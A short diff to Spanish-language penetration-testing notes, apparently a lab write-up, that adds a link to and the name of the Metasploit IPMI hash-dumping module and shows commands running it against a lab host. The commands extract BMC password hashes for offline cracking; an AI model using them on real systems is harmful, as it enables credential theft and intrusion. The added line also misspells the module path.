@@ -484,6 +484,8 @@ No es exactamente un bug, es un problema de diseño del protocolo.
 
 # 🧪 Extracción de Hashes con Metasploit
 
+Utilizamos el [scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/ipmi/ipmi_dumphashes/) `uxiliary/scanner/ipmi/ipmi_dumphashes`
+
 ```bash
 use auxiliary/scanner/ipmi/ipmi_dumphashes
 set rhosts 10.129.42.195
